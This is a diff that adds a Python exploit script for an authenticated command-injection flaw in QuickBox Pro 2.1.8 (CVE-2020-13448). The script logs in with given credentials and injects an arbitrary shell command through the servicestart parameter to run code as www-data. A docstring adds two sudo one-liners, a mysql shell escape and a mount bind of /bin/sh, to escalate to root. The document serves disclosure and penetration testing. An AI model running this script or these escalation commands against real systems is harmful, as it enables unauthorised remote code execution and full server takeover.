@@ -1,0 +1,53 @@
+# Exploit Title: QuickBox Pro 2.1.8 - Authenticated Remote Code Execution
+# Date: 2020-05-26
+# Exploit Author: s1gh
+# Vendor Homepage: https://quickbox.io/
+# Vulnerability Details: https://s1gh.sh/cve-2020-13448-quickbox-authenticated-rce/
+# Version: <= 2.1.8
+# Description: An authenticated low-privileged user can exploit a command injection vulnerability to get code-execution as www-data and escalate privileges to root due to weak sudo rules.
+# Tested on: Debian 9
+# CVE: CVE-2020-13448
+# References: https://github.com/s1gh/QuickBox-Pro-2.1.8-Authenticated-RCE
+
+'''
+Privilege escalation: After getting a reverse shell as the www-data user you can escalate to root in one of two ways.
+1. sudo mysql -e '\! /bin/sh'
+2. sudo mount -o bind /bin/sh /bin/mount;sudo mount
+
+'''
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import requests
+import argparse
+import sys
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from urllib.parse import quote_plus
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+def exploit(args):
+    s = requests.Session()
+    print('[*] Sending our payload...')
+
+    s.post('https://' + args.ip + '/inc/process.php', data={'username': args.username, 'password': args.password, 'form_submission': 'login'}, verify=False)
+    try:
+        s.get('https://' + args.ip + '/index.php?id=88&servicestart=a;' + quote_plus(args.cmd) + ';', verify=False)
+    except requests.exceptions.ReadTimeout:
+        pass
+
+def main():
+    parser = argparse.ArgumentParser(description="Authenticated RCE for QuickBox Pro <= v2.1.8")
+    parser.add_argument('-i',dest='ip',required=True,help="Target IP Address")
+    parser.add_argument('-u',dest='username',required=True,help="Username")
+    parser.add_argument('-p',dest='password',required=True,help="Password")
+    parser.add_argument('-c',dest='cmd', required=True, help="Command to execute")
+    args = parser.parse_args()
+
+    exploit(args)
+
+
+if __name__ == '__main__':
+    main()
+    sys.exit(0)
